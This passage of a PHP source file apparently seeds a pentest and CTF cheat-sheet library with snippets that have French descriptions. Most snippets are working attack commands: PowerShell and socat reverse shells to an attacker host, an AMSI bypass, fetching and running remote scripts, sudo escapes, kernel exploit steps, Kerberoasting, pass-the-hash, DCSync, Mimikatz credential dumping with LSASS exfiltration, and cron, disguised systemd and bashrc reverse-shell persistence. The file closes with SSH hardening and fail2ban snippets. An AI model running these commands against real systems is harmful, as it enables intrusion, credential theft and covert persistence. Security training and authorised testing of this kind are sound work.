IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:{{HTTP_PORT}}/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}

# AMSI bypass (Matt Graeber style) — prepend before IEX:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
PS1,
        ];
    }

    private function revshellSocatTTY(): array
    {
        return [
            'title' => 'Socat — reverse shell fully interactive (full TTY)',
            'description' => 'Alternative a Netcat : `socat` donne un TTY complet des la connexion, pas besoin de `python pty.spawn + stty`. Prereq : socat installe sur la victime (ou push static).',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['reverse-shell', 'socat', 'tty', 'pentest', 'ctf'],
            'body' => <<<'BASH'
LHOST="{{LHOST}}"
LPORT="{{LPORT}}"

# ---- Attacker (listener) --------------------------------------------------
socat file:`tty`,raw,echo=0 tcp-listen:${LPORT}

# ---- Victim (Linux) -------------------------------------------------------
socat tcp:${LHOST}:${LPORT} exec:/bin/bash,pty,stderr,setsid,sigint,sane

# ---- If socat not on victim: push a static binary first ------------------
# Grab from https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
# wget http://${LHOST}:8000/socat -O /tmp/socat && chmod +x /tmp/socat
# /tmp/socat tcp:${LHOST}:${LPORT} exec:/bin/bash,pty,stderr,setsid,sigint,sane

# ---- Encrypted variant (openssl wrapper) ---------------------------------
# Attacker:
#   openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
#   cat key.pem cert.pem > bundle.pem
#   socat OPENSSL-LISTEN:${LPORT},cert=bundle.pem,verify=0 file:`tty`,raw,echo=0
# Victim:
#   socat OPENSSL:${LHOST}:${LPORT},verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane
BASH,
        ];
    }

    // =========================================================================
    // Privilege escalation
    // =========================================================================

    private function linpeas(): array
    {
        return [
            'title' => 'LinPEAS — Linux privesc recon',
            'description' => 'Script `linpeas.sh` : enumeration exhaustive pour la privesc Linux (sudo, SUID, capabilities, cron, writable paths, NFS, Docker group, kernel exploits known). Lire en priorite : `sudo -l`, SUID 4000, writable files, cron.',
            'category' => 'privesc',
            'language' => 'bash',
            'tags' => ['linpeas', 'privesc', 'linux', 'enumeration', 'pentest', 'ctf', 'oscp', 'thm'],
            'body' => <<<'BASH'
# ---- On attacker: serve linpeas ------------------------------------------
# Clone: https://github.com/peass-ng/PEASS-ng  (or grab the raw release)
# In a dir containing linpeas.sh:
python3 -m http.server 8000

# ---- On victim: fetch + run in memory (no disk trace) --------------------
curl -sL http://{{LHOST}}:8000/linpeas.sh | bash
# or: wget -qO- http://{{LHOST}}:8000/linpeas.sh | bash
# or: curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash

# ---- Save full output and pipe grep-worthy sections ----------------------
curl -sL http://{{LHOST}}:8000/linpeas.sh | bash | tee /tmp/linpeas.out

# Sections to read first (color codes matter — RED/YELLOW = probable winner):
#   "Interesting files owned by me"
#   "SUID - Check easy privesc, exploits and write perms"
#   "Capabilities"
#   "Sudo version / -l"
#   "Readable/Writable /etc files"
#   "Cron jobs"
#   "Docker / LXC membership"
BASH,
        ];
    }

    private function winpeas(): array
    {
        return [
            'title' => 'WinPEAS — Windows privesc recon',
            'description' => 'Equivalent Windows de LinPEAS. Versions EXE (compile) et BAT (scripted). Sections clef : `UAC bypass`, `AutoRuns`, `Saved credentials`, `Unquoted service paths`, `AlwaysInstallElevated`.',
            'category' => 'privesc',
            'language' => 'powershell',
            'tags' => ['winpeas', 'privesc', 'windows', 'enumeration', 'pentest', 'oscp'],
            'body' => <<<'PS1'
# ---- Attacker: serve winPEAS ---------------------------------------------
# python3 -m http.server 8000   (with winPEAS.exe / winPEAS.bat / winPEASx64.exe)

# ---- Victim: download + run (PowerShell) ---------------------------------
$LHOST = "{{LHOST}}"

# Option A: PowerShell in memory
IEX(New-Object Net.WebClient).DownloadString("http://$LHOST:8000/winPEAS.ps1")

# Option B: drop the exe
cd $env:TEMP
Invoke-WebRequest "http://$LHOST:8000/winPEASx64.exe" -OutFile winpeas.exe
.\winpeas.exe quiet cmd fast

# ---- From cmd.exe --------------------------------------------------------
# certutil.exe -urlcache -split -f "http://LHOST:8000/winPEAS.bat" winpeas.bat
# winpeas.bat

# Sections to read first:
#   "Checking if any autorun is running under a user context"
#   "Windows credentials"  (Cmdkey, Windows Vault)
#   "Services information" (unquoted paths, modifiable binaries)
#   "SeImpersonate / SeAssignPrimaryToken"  → PrintSpoofer / JuicyPotato
#   "Registry AlwaysInstallElevated"
#   "Saved RDP connections"

# Alternative: PrivescCheck (fast, PowerShell-native)
#   IEX(New-Object Net.WebClient).DownloadString("http://$LHOST:8000/PrivescCheck.ps1"); Invoke-PrivescCheck
PS1,
        ];
    }

    private function gtfobinsSudo(): array
    {
        return [
            'title' => 'GTFOBins — top 20 sudo → root abuses',
            'description' => 'Quand `sudo -l` laisse fuiter un binaire autorise sans password : GTFOBins liste tous les contournements. Voici les 20 les plus rencontres — vim, find, less, awk, env, python, etc.',
            'category' => 'privesc',
            'language' => 'bash',
            'tags' => ['gtfobins', 'privesc', 'linux', 'sudo', 'suid', 'ctf', 'rootme', 'thm'],
            'body' => <<<'BASH'
# Prereq: `sudo -l` shows "(ALL) NOPASSWD: /usr/bin/<binary>"
# Each line = the one you paste once sudo is confirmed. Picks from gtfobins.github.io

# vim / vi / rvim / view
sudo vim -c ':!/bin/sh'
sudo vim -c ':py import os; os.execl("/bin/sh","sh","-p")'

# nano
sudo nano
# then ^R ^X reset; sh 1>&0 2>&0

# find
sudo find . -exec /bin/sh \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# gawk / mawk — same thing

# perl
sudo perl -e 'exec "/bin/sh";'

# python
sudo python -c 'import os; os.execl("/bin/sh","sh","-p")'

# less / more / man (when pager opens)
sudo less /etc/profile
# then: !sh

# env
sudo env /bin/sh

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip
TF=$(mktemp -u); sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"

# nmap (old versions — interactive mode)
sudo nmap --interactive
# nmap> !sh

# ftp
sudo ftp
# ftp> !/bin/sh

# git
sudo git -p help
# type "!sh"

# apt / apt-get
sudo apt-get changelog apt
# !/bin/sh

# systemctl (pager trick)
sudo systemctl --no-pager status
# or: sudo systemctl list-units   → opens a pager → !sh

# cp (overwrite /etc/passwd with custom root line)
# openssl passwd -1 -salt xx pwned
# echo 'hacker:$1$xx$...:0:0::/root:/bin/bash' >> /tmp/passwd
# sudo cp /tmp/passwd /etc/passwd

# docker (docker group → root)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# wget (write an authorized_keys or a cron file)
TF=$(mktemp)
sudo wget http://{{LHOST}}/malicious.sh -O /etc/cron.d/pwn

# ---- Full catalog ---------------------------------------------------------
# https://gtfobins.github.io/#+sudo
BASH,
        ];
    }

    private function kernelExploits(): array
    {
        return [
            'title' => 'Linux kernel exploits — DirtyCOW, DirtyPipe, PwnKit',
            'description' => 'Trois CVE qui ont fait l\'histoire et restent presents sur les box non patchees : DirtyCOW (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit / polkit (CVE-2021-4034). Detection + PoC.',
            'category' => 'privesc',
            'language' => 'bash',
            'tags' => ['kernel', 'privesc', 'linux', 'cve', 'dirtycow', 'dirtypipe', 'pwnkit', 'ctf', 'thm'],
            'body' => <<<'BASH'
# ---- Detection ------------------------------------------------------------
uname -r              # kernel version
cat /etc/os-release   # distro
getcap -r / 2>/dev/null
dpkg -l | grep -i polkit    # PwnKit = pkexec

# ---- DirtyCOW (CVE-2016-5195) — kernel <= 4.8.3 --------------------------
# PoC: https://github.com/FireFart/dirtycow/blob/master/dirty.c
#   gcc -pthread dirty.c -o dirty -lcrypt
#   ./dirty new_pass      → creates a root user "firefart" with <new_pass>
#   su firefart

# ---- DirtyPipe (CVE-2022-0847) — kernel 5.8 through 5.16.11 -------------
# PoC: https://dirtypipe.cm4all.com/  or https://haxx.in/files/dirtypipez.c
#   gcc dirtypipez.c -o dp
#   ./dp /usr/bin/sudo   → overwrites any SUID root binary to spawn shell
# Also works to corrupt /etc/passwd without write permissions.

# ---- PwnKit (CVE-2021-4034) — polkit pkexec ------------------------------
# Affects every Linux with pkexec from 2009 until Jan 2022. Trivial.
# PoC (C): https://github.com/berdav/CVE-2021-4034
#   git clone https://github.com/berdav/CVE-2021-4034.git
#   cd CVE-2021-4034 && make && ./cve-2021-4034

# PoC (no-compile, pure sh): https://github.com/ly4k/PwnKit
#   curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh | sh

# ---- Automated finder ----------------------------------------------------
# https://github.com/The-Z-Labs/linux-exploit-suggester
./linux-exploit-suggester.sh
BASH,
        ];
    }

    private function seImpersonate(): array
    {
        return [
            'title' => 'Windows SeImpersonatePrivilege → SYSTEM (PrintSpoofer / JuicyPotatoNG)',
            'description' => 'Le scenario le plus classique d\'IIS / MSSQL / SQL Server : utilisateur de service avec `SeImpersonatePrivilege`. Escalade vers NT AUTHORITY\\SYSTEM via PrintSpoofer (Win10+) ou JuicyPotatoNG (old Windows).',
            'category' => 'privesc',
            'language' => 'powershell',
            'tags' => ['privesc', 'windows', 'seimpersonate', 'printspoofer', 'juicypotato', 'iis', 'pentest', 'oscp'],
            'body' => <<<'PS1'
# ---- Detection ------------------------------------------------------------
whoami /priv
# SeImpersonatePrivilege  → required for Potato-family attacks
# SeAssignPrimaryTokenPrivilege → same thing for some variants

# ---- PrintSpoofer (Win10 / Win2019+) --------------------------------------
# Requires the Print Spooler service running + SeImpersonate.
# Download: https://github.com/itm4n/PrintSpoofer
.\PrintSpoofer.exe -i -c cmd.exe
# -i = interactive, -c cmd = execute whoami to confirm SYSTEM
# Then from NT AUTHORITY\SYSTEM:
whoami
net user hacker P@ssw0rd! /add
net localgroup administrators hacker /add

# ---- JuicyPotatoNG (pre-Win10 1809, or when Spooler is disabled) ---------
# https://github.com/antonioCoco/JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami > C:\Windows\Temp\who.txt"

# ---- GodPotato (newer variant for Win10/11 21H1+) ------------------------
# https://github.com/BeichenDream/GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"

# ---- RoguePotato (Win 2019 older patch) ----------------------------------
# Attacker host: socat TCP-LISTEN:135,fork,reuseaddr TCP:VICTIM_IP:9999
# Victim: .\RoguePotato.exe -r {{LHOST}} -e "cmd.exe" -l 9999

# Reverse shell once SYSTEM: invoke the Windows PowerShell revshell above.
PS1,
        ];
    }

    // =========================================================================
    // Active Directory
    // =========================================================================

    private function kerberoasting(): array
    {
        return [
            'title' => 'Kerberoasting — SPN hash extraction + crack',
            'description' => 'Tout utilisateur authentifie peut demander un TGS pour n\'importe quel SPN — le TGS est chiffre avec le hash NT du compte de service. Crack offline avec hashcat mode 13100. Rapide a tester et tres souvent rentable.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['kerberoasting', 'active-directory', 'kerberos', 'impacket', 'rubeus', 'ctf', 'oscp'],
            'body' => <<<'BASH'
DOMAIN="{{DOMAIN}}"
DC_IP="{{DC_IP}}"
USER="{{USER}}"
PASS="{{PASS}}"

# ---- Impacket (Linux attacker) -------------------------------------------
impacket-GetUserSPNs "${DOMAIN}/${USER}:${PASS}" -dc-ip "${DC_IP}" -request \
    -outputfile kerberoast.hashes

# Pass-the-hash variant:
# impacket-GetUserSPNs "${DOMAIN}/${USER}" -hashes :NTHASH -dc-ip "${DC_IP}" -request

# ---- Rubeus (on-host Windows) --------------------------------------------
# Rubeus.exe kerberoast /outfile:hashes.txt
# Rubeus.exe kerberoast /rc4opsec  (avoid AES)
# Rubeus.exe kerberoast /user:svc_sql /simple

# ---- Crack with hashcat (mode 13100) -------------------------------------
hashcat -m 13100 -a 0 kerberoast.hashes /usr/share/wordlists/rockyou.txt

# ---- Follow-up: pth to the service account -------------------------------
# If svc_sql has access to DB: use impacket-mssqlclient or a WinRM shell.
BASH,
        ];
    }

    private function asrepRoasting(): array
    {
        return [
            'title' => 'AS-REP Roasting — DONT_REQ_PREAUTH hash extraction',
            'description' => 'Comptes avec `UF_DONT_REQUIRE_PREAUTH` : le DC livre un AS-REP chiffre avec le hash NT sans authentification prealable. Enumerer avec rpcclient ou BloodHound, puis demander avec GetNPUsers. Crack mode 18200.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['asrep-roasting', 'active-directory', 'kerberos', 'impacket', 'ctf', 'oscp'],
            'body' => <<<'BASH'
DOMAIN="{{DOMAIN}}"
DC_IP="{{DC_IP}}"
USERS="users.txt"   # one username per line

# ---- Spray without credentials (null bind) -------------------------------
# Anonymous enumeration — works on many old/misconfigured domains
impacket-GetNPUsers "${DOMAIN}/" -usersfile "${USERS}" -dc-ip "${DC_IP}" \
    -format hashcat -outputfile asrep.hashes -no-pass

# ---- With credentials (more reliable) ------------------------------------
USER="{{USER}}"
PASS="{{PASS}}"
impacket-GetNPUsers "${DOMAIN}/${USER}:${PASS}" -request \
    -dc-ip "${DC_IP}" -format hashcat -outputfile asrep.hashes

# ---- Rubeus (Windows on-host) --------------------------------------------
# Rubeus.exe asreproast /nowrap /format:hashcat

# ---- Crack with hashcat (mode 18200) -------------------------------------
hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt

# ---- Build users.txt when you have nothing -------------------------------
# kerbrute userenum -d ${DOMAIN} --dc ${DC_IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
BASH,
        ];
    }

    private function bloodhound(): array
    {
        return [
            'title' => 'BloodHound — SharpHound collection + key queries',
            'description' => 'Enumeration AD complete avec SharpHound, puis exploration graphique avec BloodHound. Les 5 queries pre-integrees indispensables pour identifier un chemin d\'escalade vers Domain Admins en quelques clics.',
            'category' => 'post-exploitation',
            'language' => 'bash',
            'tags' => ['bloodhound', 'sharphound', 'active-directory', 'enumeration', 'pentest', 'oscp'],
            'body' => <<<'BASH'
DOMAIN="{{DOMAIN}}"
DC_IP="{{DC_IP}}"
USER="{{USER}}"
PASS="{{PASS}}"

# ---- Collection (Linux attacker) -----------------------------------------
bloodhound-python -u "${USER}" -p "${PASS}" -d "${DOMAIN}" -ns "${DC_IP}" \
    -c All --zip

# ---- Collection (Windows on-host) ----------------------------------------
# .\SharpHound.exe -c All --zipfilename loot.zip
# Or: .\SharpHound.exe -c DCOnly   (stealthier — no SMB/RPC loop)

# ---- Start Neo4j + BloodHound UI -----------------------------------------
# sudo neo4j console  (or: systemctl start neo4j)
# bloodhound          (upload the .zip via Upload Data)

# ---- Top-10 queries to run immediately -----------------------------------
#  1. Find all Domain Admins
#  2. Find Shortest Paths to Domain Admins
#  3. Find Principals with DCSync Rights
#  4. Find Computers where Domain Users are Local Admin
#  5. Shortest Path from Owned Principals
#  6. Kerberoastable accounts
#  7. AS-REP Roastable users (DontReqPreAuth)
#  8. Machines with Unconstrained Delegation
#  9. Computers with Resource-Based Constrained Delegation
# 10. Find Shortest Paths from "Domain Users" to High Value Targets

# Cypher snippets for edges not shown by default:
#   MATCH p=shortestPath((u:User {name:"${USER}@${DOMAIN}"})-[*1..]->(n:Group {name:"DOMAIN ADMINS@${DOMAIN}"})) RETURN p
BASH,
        ];
    }

    private function pthDcsync(): array
    {
        return [
            'title' => 'Pass-the-Hash + DCSync — credential dumping to DA',
            'description' => 'Deux primitives AD essentielles : PTH pour s\'authentifier sans password (juste le hash NT), et DCSync pour extraire tous les hashes du domaine via l\'API de replication (requiert Replicating Directory Changes).',
            'category' => 'post-exploitation',
            'language' => 'bash',
            'tags' => ['pth', 'dcsync', 'active-directory', 'impacket', 'mimikatz', 'credentials', 'pentest', 'oscp'],
            'body' => <<<'BASH'
DOMAIN="{{DOMAIN}}"
DC_IP="{{DC_IP}}"
USER="{{USER}}"
NTHASH="{{NTHASH}}"     # 32-hex NT hash

# ===========================================================================
# PASS-THE-HASH
# ===========================================================================

# ---- psexec-like shell via PTH -------------------------------------------
impacket-psexec "${DOMAIN}/${USER}@${DC_IP}" -hashes ":${NTHASH}"
impacket-smbexec "${DOMAIN}/${USER}@${DC_IP}" -hashes ":${NTHASH}"
impacket-wmiexec "${DOMAIN}/${USER}@${DC_IP}" -hashes ":${NTHASH}"

# ---- CrackMapExec (lateral mvmnt + exec) ---------------------------------
crackmapexec smb ${DC_IP} -u "${USER}" -H "${NTHASH}" -d "${DOMAIN}" -x whoami

# ---- Evil-WinRM (clean interactive shell on WinRM 5985/5986) --------------
evil-winrm -i ${DC_IP} -u ${USER} -H ${NTHASH}

# ===========================================================================
# DCSync (requires Replicating Directory Changes perms or DA equivalence)
# ===========================================================================

# ---- Impacket (Linux) ----------------------------------------------------
impacket-secretsdump "${DOMAIN}/${USER}@${DC_IP}" -hashes ":${NTHASH}" \
    -just-dc -output dump

# Krbtgt only (for golden tickets):
impacket-secretsdump "${DOMAIN}/${USER}@${DC_IP}" -hashes ":${NTHASH}" \
    -just-dc-user "krbtgt"

# ---- Mimikatz (on a DC or after token impersonation) ---------------------
# mimikatz # lsadump::dcsync /domain:${DOMAIN} /user:krbtgt
# mimikatz # lsadump::dcsync /domain:${DOMAIN} /all /csv

# ---- After DCSync: Golden Ticket -----------------------------------------
# impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${DOMAIN} Administrator
# export KRB5CCNAME=Administrator.ccache
# impacket-psexec -k -no-pass ${DC_IP}
BASH,
        ];
    }

    // =========================================================================
    // Post-exploitation
    // =========================================================================

    private function pivotChiselSsh(): array
    {
        return [
            'title' => 'Pivoting — Chisel + SSH dynamic forward + proxychains',
            'description' => 'Deux approches pour pivoter vers un reseau interne : Chisel (tunnel HTTP inverse quand SSH n\'est pas possible) et `ssh -D` (dynamic forward SOCKS quand on a un shell SSH). Combine avec proxychains pour router n\'importe quel outil.',
            'category' => 'post-exploitation',
            'language' => 'bash',
            'tags' => ['pivoting', 'chisel', 'ssh', 'proxychains', 'lateral-movement', 'pentest', 'oscp'],
            'body' => <<<'BASH'
# ===========================================================================
# OPTION A: SSH dynamic port forward (you have shell + ssh creds)
# ===========================================================================
# From attacker:
ssh -D 1080 -N -f {{USER}}@{{PIVOT_IP}}
# Then all SOCKS5 traffic through 127.0.0.1:1080

# ===========================================================================
# OPTION B: Chisel (no ssh access, fileless on victim)
# ===========================================================================
# Attacker (server, listens on 8000, accepts reverse tunnels):
./chisel server -p 8000 --reverse

# Victim (client, opens a reverse SOCKS tunnel back to attacker):
./chisel client {{LHOST}}:8000 R:1080:socks
# Result: attacker has a SOCKS5 proxy on 127.0.0.1:1080 routing through victim.

# Specific port forward (e.g., hit internal MSSQL 10.10.30.5:1433 from attacker):
./chisel client {{LHOST}}:8000 R:1433:10.10.30.5:1433

# ===========================================================================
# Configure proxychains
# ===========================================================================
# /etc/proxychains4.conf:
#   [ProxyList]
#   socks5 127.0.0.1 1080

# Route any tool through the tunnel:
proxychains nmap -sT -Pn 10.10.30.0/24 -p 22,80,443,445,3389
proxychains smbclient -L //10.10.30.5 -U '{{USER}}%{{PASS}}'
proxychains evil-winrm -i 10.10.30.5 -u {{USER}} -p '{{PASS}}'
proxychains curl http://10.10.30.10/

# ===========================================================================
# ligolo-ng (modern alternative — full TUN interface, no proxychains)
# ===========================================================================
# Attacker: ./proxy -selfcert
# Victim:   ./agent -connect {{LHOST}}:11601 -ignore-cert
# Then on attacker: sudo ip route add 10.10.30.0/24 dev ligolo
BASH,
        ];
    }

    private function mimikatzLazagne(): array
    {
        return [
            'title' => 'Credential dumping — Mimikatz + LaZagne (Win + Linux)',
            'description' => 'Mimikatz pour les credentials Windows (LSASS, SAM, DPAPI, cached), LaZagne pour les browsers/chat/wifi/db sur les deux OS. Pense a dump LSASS hors ligne avec `comsvcs.dll` pour eviter l\'AV au moment du dump.',
            'category' => 'post-exploitation',
            'language' => 'powershell',
            'tags' => ['mimikatz', 'lazagne', 'credentials', 'dumping', 'post-exploitation', 'pentest', 'oscp'],
            'body' => <<<'PS1'
# ===========================================================================
# MIMIKATZ (Windows, requires SeDebugPrivilege → local admin or SYSTEM)
# ===========================================================================
# .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # log                            # save output to a file
mimikatz # sekurlsa::logonpasswords       # interactive logons: NT hashes + (sometimes) cleartext
mimikatz # sekurlsa::msv                  # NTLM hashes only
mimikatz # sekurlsa::tickets /export      # Kerberos tickets → pth / ptt / golden
mimikatz # lsadump::sam                   # local SAM hashes
mimikatz # lsadump::cache                 # domain cached credentials (MSCash)
mimikatz # lsadump::lsa /patch            # patch LSASS to dump secrets
mimikatz # dpapi::masterkey /in:"$env:APPDATA\Microsoft\Protect\<SID>\<GUID>"

# ---- Offline LSASS dump (stealthier — extract later on attacker host) ---
# PowerShell (SYSTEM):
tasklist /svc | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
# Exfil lsass.dmp to attacker, then:
#   mimikatz # sekurlsa::minidump lsass.dmp
#   mimikatz # sekurlsa::logonpasswords

# ===========================================================================
# LaZagne (Windows)
# ===========================================================================
# Download: https://github.com/AlessandroZ/LaZagne/releases
.\LaZagne.exe all                         # every module
.\LaZagne.exe browsers                    # Chrome/Firefox/Edge credentials
.\LaZagne.exe mails                       # Outlook, Thunderbird

# ===========================================================================
# LaZagne (Linux — same tool, needs python)
# ===========================================================================
# git clone https://github.com/AlessandroZ/LaZagne.git
# cd LaZagne/Linux && python laZagne.py all
# /etc/shadow, keyrings, browsers, wifi, ssh keys...
PS1,
        ];
    }

    private function linuxPersistence(): array
    {
        return [
            'title' => 'Linux persistence — 3 techniques (cron / systemd / bashrc)',
            'description' => 'Trois techniques simples et differenciees pour maintenir l\'acces : cron (user-level, discret), systemd (root-level, resilient a reboot), SSH authorized_keys (facile mais bruyant). Utiles en CTF sur les box long-running et en pentest autorise.',
            'category' => 'post-exploitation',
            'language' => 'bash',
            'tags' => ['persistence', 'linux', 'cron', 'systemd', 'ssh', 'post-exploitation', 'pentest'],
            'body' => <<<'BASH'
LHOST="{{LHOST}}"
LPORT="{{LPORT}}"

# ===========================================================================
# 1. User crontab (no root needed)
# ===========================================================================
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'") | crontab -
# Check:
crontab -l

# ===========================================================================
# 2. Systemd service (root, survives reboot, can mask as something legit)
# ===========================================================================
cat > /etc/systemd/system/sys-backup.service <<EOF
[Unit]
Description=System backup helper
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now sys-backup.service

# ===========================================================================
# 3. SSH authorized_keys (durable, detected by file integrity monitoring)
# ===========================================================================
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3Nz...your_pubkey...== attacker@vps" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Variant: drop a pubkey in /root/.ssh/authorized_keys if you have root.

# ===========================================================================
# Bonus: ~/.bashrc trigger (fires on every interactive login as victim user)
# ===========================================================================
echo 'bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" &' >> ~/.bashrc

# ===========================================================================
# ⚠️ Autorise uniquement dans le cadre de tes propres labs / missions signees.
# ===========================================================================
BASH,
        ];
    }

    // =========================================================================
    // Defense
    // =========================================================================

    private function sshHardening(): array
    {
        return [
            'title' => 'SSH hardening — sshd_config template (keys only, no root)',
            'description' => 'Template `sshd_config` durci : authentification par cle uniquement, desactivation du login root, timeout d\'inactivite, allowgroups, MaxAuthTries. A appliquer sur tout VPS de prod AVANT d\'exposer SSH.',
            'category' => 'defense',
            'language' => 'bash',
            'tags' => ['ssh', 'hardening', 'defense', 'blue-team', 'sshd', 'sysadmin'],
            'body' => <<<'BASH'
# /etc/ssh/sshd_config (Debian/Ubuntu). Test avec: sshd -t
# Toujours garder une session SSH ouverte avant de reload — en cas de lockout.

cat > /etc/ssh/sshd_config.d/99-hardening.conf <<'EOF'
# --- Protocol & auth -----
Protocol 2
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
KerberosAuthentication no
GSSAPIAuthentication no

# --- Rate limiting ----
MaxAuthTries 3
MaxSessions 4
LoginGraceTime 30

# --- Idle / keepalive ----
ClientAliveInterval 300
ClientAliveCountMax 2

# --- Who can log in ----
AllowGroups ssh-users
# (create: groupadd ssh-users; usermod -aG ssh-users <user>)

# --- Misc hardening ----
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no      # set 'yes' only if you need SSH tunnels
PermitUserEnvironment no
Banner /etc/issue.net

# --- Modern ciphers only ----
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256
EOF

# Validate then reload
sshd -t && systemctl reload ssh

# Generate modern host keys (Ed25519) if missing
ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N ""

# Audit tool: https://github.com/jtesta/ssh-audit
ssh-audit localhost
BASH,
        ];
    }

    private function fail2banJail(): array
    {
        return [
            'title' => 'fail2ban — custom jail for application auth failures',
            'description' => 'fail2ban parse les logs d\'une app (Nginx, sshd, ou log applicatif) et banit via iptables les IPs qui depassent un seuil d\'echec d\'auth. Exemple : jail Nginx pour bruteforce sur un endpoint `/login` applicatif.',
            'category' => 'defense',
            'language' => 'bash',
            'tags' => ['fail2ban', 'defense', 'blue-team', 'nginx', 'sshd', 'iptables', 'sysadmin'],
            'body' => <<<'BASH'
# ---- Install --------------------------------------------------------------
apt install fail2ban
systemctl enable --now fail2ban

# ===========================================================================
# 1. Custom filter: detect 401/403 bursts from the same IP on /login
# ===========================================================================
cat > /etc/fail2ban/filter.d/nginx-login.conf <<'EOF'
[Definition]
# Matches lines like:
# 1.2.3.4 - - [20/Apr/2026:08:15:01 +0000] "POST /login HTTP/1.1" 401 ...
failregex = ^<HOST> -.*"(GET|POST) /login.*" (401|403)
ignoreregex =
EOF

# ===========================================================================
# 2. Jail wiring
# ===========================================================================
cat > /etc/fail2ban/jail.d/nginx-login.local <<'EOF'
[nginx-login]
enabled  = true
port     = http,https
filter   = nginx-login
logpath  = /var/log/nginx/access.log
maxretry = 5
findtime = 10m
bantime  = 1h
action   = iptables-multiport[name=nginx-login, port="http,https"]
EOF

# ===========================================================================
# 3. Built-in sshd jail (tighter than default)
# ===========================================================================
cat > /etc/fail2ban/jail.d/sshd.local <<'EOF'
[sshd]
enabled  = true
port     = ssh
maxretry = 3
findtime = 10m
bantime  = 1d
EOF

# ---- Reload + check -------------------------------------------------------
systemctl restart fail2ban
fail2ban-client status
fail2ban-client status sshd
fail2ban-client status nginx-login

# Unban by hand:
fail2ban-client set nginx-login unbanip 1.2.3.4

# Test the regex against the live log without enabling the jail:
fail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-login.conf
BASH,
        ];
    }
}
